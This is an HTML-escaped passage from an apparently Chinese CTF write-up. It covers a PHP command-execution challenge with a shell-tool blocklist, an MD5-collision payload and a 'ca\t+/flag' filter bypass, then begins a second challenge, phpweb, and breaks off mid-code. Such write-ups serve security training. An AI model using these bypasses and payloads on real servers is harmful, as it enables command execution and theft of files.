class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;error_reporting(E_ALL || ~ E_NOTICE);&lt;br&gt;header(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;content-type:text/html;charset=utf-8&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;]) || !&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;])) &lt;br&gt;    header(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;amp;cmd=&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt; = hex2bin(base64_decode(base64_decode(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;])));&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt; = preg_replace(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/[^a-zA-Z0-9.]+/&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/flag/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;)) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;lt;img src =&amp;quot;./ctf3.jpeg&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;xixi～ no flag&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$txt&lt;/span&gt; = base64_encode(file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;));&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;img src=&amp;#x27;data:image/gif;base64,&amp;quot;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$txt&lt;/span&gt; . &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;#x27;&amp;gt;&amp;lt;/img&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&amp;#x27;|\&amp;quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&amp;#123;|\&amp;#125;|\(|\)|\&amp;amp;[^\d]|@|\||\\$|\[|\]|&amp;#123;|&amp;#125;|\(|\)|-|&amp;lt;|&amp;gt;/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt;)) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;forbid ~&amp;quot;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;] !== (&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;] &amp;amp;&amp;amp; md5(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;]) === md5(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; `&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt;`;&lt;br&gt;    &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; (&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;md5 is funny ~&amp;quot;&lt;/span&gt;);&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;lt;style&amp;gt;&lt;br&gt;  body&amp;#123;&lt;br&gt;   background:url(./bj.png)  no-repeat center center;&lt;br&gt;   background-size:cover;&lt;br&gt;   background-attachment:fixed;&lt;br&gt;   background-color:&lt;span class=&#34;hljs-comment&#34;&gt;#CCCCCC;&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&amp;lt;/style&amp;gt;&lt;br&gt;&amp;lt;body&amp;gt;&lt;br&gt;&amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;其中 &lt;code&gt;if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;amp;&amp;amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))&lt;/code&gt;  利用 payload&lt;/p&gt;
&lt;figure class=&#34;highlight llvm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs llvm&#34;&gt;a&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c9&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%68&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%ff&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%e3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d4&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%77&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%15&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%87&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%a7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%1&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%dc&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%56&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;a&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%78&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%18&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%af&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%bf&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%00&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%28&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%f3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%8&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%55&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%42&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%75&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%93&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%49&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%67&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%a0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d1&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%55&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%83&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%60&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fb&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%07&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fe&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&amp;amp;b&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c9&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%68&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%ff&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%e3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d4&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%77&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%15&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%87&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%a7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%1&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%dc&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%56&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;a&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%78&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%18&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%af&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%bf&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%02&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%28&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%f3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%8&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%55&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%42&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%75&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%93&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%49&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%67&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%a0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d1&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d5&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%83&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%60&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fb&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%07&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fe&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;来绕过&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$cmd 过滤了一些字符，直接 &lt;code&gt;ca\t+/flag&lt;/code&gt;  绕过拿到 flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;网鼎杯-2020-朱雀组phpweb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网鼎杯-2020-朱雀组phpweb&#34;&gt;#&lt;/a&gt; [网鼎杯 2020 朱雀组] phpweb&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;查看源代码发现有隐藏表单，发送 data 和时间，可能存在命令执行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;eval、system 等函数会被检测，于是先 file_get_contents 读一下 index.php:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$disable_fun&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;shell_exec&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;passthru&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;proc_open&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;show_source&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;phpinfo&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;popen&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;dl&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;eval&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;proc_terminate&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;touch&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;escapeshellcmd&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;escapeshellarg&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;assert&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;substr_replace&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;call_user_func_array&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;call_user_func&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_filter&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_walk&amp;quot;&lt;/span&gt;,  &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_map&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;registregister_shutdown_function&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;register_tick_function&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;filter_var&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;filter_var_array&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;uasort&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;uksort&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_reduce&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_walk&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_walk_recursive&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pcntl_exec&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;fopen&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;fwrite&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file_put_contents&amp;quot;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;gettime&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$result&lt;/span&gt; = call_user_func(&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;= gettype(&lt;span class=&#34;hljs-variable&#34;&gt;$result&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt; == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;string&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span 